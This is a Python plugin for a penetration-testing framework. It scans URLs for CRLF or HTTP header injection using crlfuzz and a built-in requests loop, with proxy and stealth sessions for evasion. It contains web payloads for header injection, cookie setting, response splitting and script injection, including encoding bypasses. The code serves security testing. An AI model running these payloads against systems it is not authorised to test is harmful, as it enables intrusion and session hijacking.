"""
PenLabs V1.0 — CRLF Injection Scanner Plugin
Phát hiện CRLF Injection (%0d%0a) cho phép HTTP Header Injection.
Ưu tiên crlfuzz (Go binary), fallback built-in Python.
"""
import os
import json
import shutil
import logging
import subprocess
import requests
from urllib.parse import urlparse, quote
from core.base_plugin import BasePlugin
from core.evidence import attach_evidence, make_evidence

logger = logging.getLogger(__name__)

# CRLF payloads
CRLF_PAYLOADS = [
    "%0d%0aInjected-Header:PenLabs",
    "%0d%0aSet-Cookie:pwned=true",
    "%0a%20Injected-Header:PenLabs",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK",
    "%E5%98%8A%E5%98%8DInjected-Header:PenLabs",  # Unicode bypass
    "%%0d0a%0d%0aInjected-Header:PenLabs",         # Double encoding
    "%0d%0a%0d%0a<script>alert('CRLF')</script>",
    "%23%0d%0aInjected-Header:PenLabs",             # After fragment
]


class CRLFPlugin(BasePlugin):
    def name(self) -> str:
        return "CRLFScan"

    def description(self) -> str:
        return "CRLF Injection Scanner — Phát hiện HTTP Header Injection qua %%0d%%0a payloads (crlfuzz + built-in)."

    def check_installed(self) -> bool:
        if shutil.which("crlfuzz"):
            return True
        go_bin = os.path.expanduser("~/go/bin/crlfuzz")
        if os.path.isfile(go_bin) and os.access(go_bin, os.X_OK):
            return True
        return True  # Fallback built-in always available

    def run(self, urls: list, out_dir: str = "/tmp",
            headers: dict = None, timeout: int = 10,
            max_urls: int = 50, proxy_mode: str = "fuzz") -> list:
        """
        Quét CRLF Injection trên danh sách URLs.
        """
        os.makedirs(out_dir, exist_ok=True)
        findings = []

        #  Use StealthNet session for unified fingerprinting
        from plugins.stealth_net_plugin import StealthNetPlugin
        stealth_net = StealthNetPlugin(scan_mode=proxy_mode)
        stealth_net.run()
        session = stealth_net._session

        # Strategy 1: Try crlfuzz (faster, more comprehensive)
        crlfuzz_bin = shutil.which("crlfuzz") or os.path.expanduser("~/go/bin/crlfuzz")
        if os.path.isfile(crlfuzz_bin) and os.access(crlfuzz_bin, os.X_OK):
            findings = self._run_crlfuzz(urls, out_dir, crlfuzz_bin, max_urls, timeout, proxy_mode)
        
        # Strategy 2: Built-in Python fallback (always runs to supplement)
        builtin_findings = self._run_builtin(session, urls, headers, timeout, max_urls)
        
        # Merge findings (deduplicate by URL)
        seen_urls = {f.get("url", "") for f in findings}
        for bf in builtin_findings:
            if bf.get("url") not in seen_urls:
                findings.append(bf)

        # Save results
        out_file = os.path.join(out_dir, "crlf_findings.json")
        with open(out_file, "w") as f:
            json.dump(findings, f, indent=2, default=str)

        logger.info(f"[CRLFScan] Found {len(findings)} CRLF injection points.")
        return findings

    def _run_crlfuzz(self, urls: list, out_dir: str, binary: str,
                     max_urls: int, timeout: int, proxy_mode: str) -> list:
        """Chạy crlfuzz Go binary."""
        findings = []
        try:
            # Write URLs to temp file
            url_file = os.path.join(out_dir, "crlf_targets.txt")
            with open(url_file, "w") as f:
                f.write("\n".join(urls[:max_urls]))

            output_file = os.path.join(out_dir, "crlfuzz_output.txt")
            cmd = [
                binary,
                "-l", url_file,
                "-o", output_file,
                "-s",  # Silent
            ]
            
            from config import Config as _Cfg
            proxy_url = _Cfg.get_proxy_url(proxy_mode)
            if proxy_url:
                cmd.extend(["-x", proxy_url])

            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=timeout * max_urls,
            )

            if os.path.isfile(output_file):
                with open(output_file) as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            finding = {
                                "url": line,
                                "tool": "crlfuzz",
                                "severity": "medium",
                                "type": "crlf_injection",
                                "finding_type": "crlf_injection",
                                "matched_at": line,
                                "confidence": "medium",
                                "source": "crlfuzz",
                                "evidence": "crlfuzz reported injectable URL",
                            }
                            findings.append(attach_evidence(finding, make_evidence(
                                method="GET",
                                url=line,
                                status_code="unknown",
                                validation="crlfuzz reported URL as CRLF injectable",
                                raw_artifact=output_file,
                                confidence="medium",
                            )))
        except subprocess.TimeoutExpired:
            logger.warning("[CRLFScan] crlfuzz timed out.")
        except Exception as e:
            logger.debug(f"[CRLFScan] crlfuzz error: {e}")

        return findings

    def _run_builtin(self, session, urls: list, headers: dict = None,
                     timeout: int = 10, max_urls: int = 50) -> list:
        """Built-in CRLF detector using Python requests session."""
        findings = []

        for url in urls[:max_urls]:
            for payload in CRLF_PAYLOADS[:4]:  # Top 4 payloads
                try:
                    # Inject into URL path
                    test_url = url.rstrip("/") + "/" + payload
                    resp = session.get(
                        test_url,
                        headers=headers or {},
                        timeout=timeout,
                        allow_redirects=False
                    )

                    # Check if injected header appears in response actually parsed as a header
                    if "PenLabs" in str(resp.headers.get("Injected-Header", "")) or "pwned=true" in str(resp.headers.get("Set-Cookie", "")):
                        injected_header = "Injected-Header" if "PenLabs" in str(resp.headers.get("Injected-Header", "")) else "Set-Cookie"
                        finding = {
                            "url": url,
                            "payload": payload,
                            "tool": "builtin",
                            "severity": "medium",
                            "type": "crlf_injection",
                            "finding_type": "crlf_injection",
                            "matched_at": url,
                            "confidence": "medium",
                            "source": "builtin",
                            "evidence": "Injected header reflected in response",
                        }
                        findings.append(attach_evidence(finding, make_evidence(
                            method="GET",
                            url=test_url,
                            payload=payload,
                            status_code=resp.status_code,
                            request_headers=headers or {},
                            response_headers=dict(resp.headers),
                            validation=f"Injected header parsed by client: {injected_header}",
                            confidence="high",
                        )))
                        break  # One finding per URL is enough

                    # Check for XSS via CRLF (response splitting)
                    if "<script>alert('CRLF')</script>" in resp.text:
                        finding = {
                            "url": url,
                            "payload": payload,
                            "tool": "builtin",
                            "severity": "high",
                            "type": "crlf_to_xss",
                            "finding_type": "crlf_to_xss",
                            "matched_at": url,
                            "confidence": "high",
                            "source": "builtin",
                            "evidence": "HTTP Response Splitting → XSS achieved",
                        }
                        findings.append(attach_evidence(finding, make_evidence(
                            method="GET",
                            url=test_url,
                            payload=payload,
                            status_code=resp.status_code,
                            request_headers=headers or {},
                            response_headers=dict(resp.headers),
                            response_snippet=resp.text,
                            validation="Response body contains injected script after CRLF payload",
                            confidence="high",
                        )))
                        break

                except Exception:
                    continue

        return findings
